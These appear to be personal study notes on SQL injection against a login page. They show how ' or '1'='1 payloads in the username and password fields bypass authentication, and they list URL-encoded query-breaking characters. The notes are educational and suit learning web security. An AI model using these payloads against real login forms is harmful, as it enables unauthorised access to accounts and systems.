we can inject a new logic element into the query in order to subvert cerain security features 

for example a login page 

a normal login attempt would look like this:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

we can use an injection by first finding a character that breaks the query and then injecting a new logic to bypass the need for a correct password like this:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

if we dont know the username aswell we can use something like this: 

```sql
SELECT * FROM logins WHERE username='notadmin' or '1'='1' AND password = 'something' or '1'='1;
```
by using -> <span style="color:rgb(255, 0, 0)">something' or '1'='1</span> as the password 

this happens because the AND statement gets evaluated first and later the OR 

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |
